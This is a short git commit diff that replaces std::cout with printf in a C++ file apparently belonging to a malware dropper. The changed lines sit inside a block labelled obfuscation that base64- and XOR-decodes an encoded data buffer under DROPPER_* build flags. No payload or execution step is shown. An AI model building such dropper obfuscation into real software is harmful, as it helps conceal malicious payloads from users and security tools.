73b236ae08817c529a832639453852b0ae346ad2
Adi <adindeshpande@gmail.com>
2026-07-05 14:31:14 -0500

    changed std::cout to printf

--- Linux_mint_22.3/FileSystem_exe_rebuild/FileSystem_exe_rebuild.cpp
+++ Linux_mint_22.3/FileSystem_exe_rebuild/FileSystem_exe_rebuild.cpp
@@ -80,12 +80,12 @@ int main(int argc, char* argv[])
 	// Obfuscation Procedures start here
 
 	#if DROPPER_BASE64 == 1
-		std::cout << "Base64 has been run!\n";
+		printf("Base64 has been run!\n");
 		data = base64decode(data, &size);
 	#endif
 
 	#if DROPPER_XOR_KEY != 0
-		std::cout << "Xor has been run!\n";
+		printf("Xor has been run!\n");
 		data = XOR(data, size);
 	#endif
 
